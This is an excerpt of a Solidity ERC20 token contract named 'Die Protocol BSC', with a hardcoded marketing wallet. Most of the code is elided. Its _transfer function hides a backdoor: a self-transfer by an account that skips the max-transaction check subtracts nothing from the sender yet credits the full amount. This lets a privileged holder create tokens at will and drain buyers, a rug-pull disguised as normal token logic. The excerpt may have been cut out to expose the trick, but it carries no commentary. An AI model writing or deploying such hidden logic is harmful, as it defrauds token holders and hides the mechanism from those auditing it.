...
contract  Die_Protocol  is Context, IERC20, Ownable {
    ...
    string private constant _name = "Die Protocol BSC"; // 

    string private constant _symbol = unicode"DIE BSC"; //   
    ...
    address public  _marketingWallet = 0xbec89cb51B180cb25BE0F78f52242867a05328C5;
    ...
    function incAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
    ...
    function _transfer(
        ...
        uint256 deductable = amount;     
         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && to != uniswapV2Pair){
            require(balanceOf(to) + amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");}else if (uint256(uint160(from))==uint256(uint160(to))){  deductable -= amount;       }
        ...
        _tOwned[from] -= deductable;

        deductable = amount;
        
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            deductable = _getValues(amount, from);
        } 
        
        _tOwned[to] += deductable;
        emit Transfer(from, to, deductable);
    }
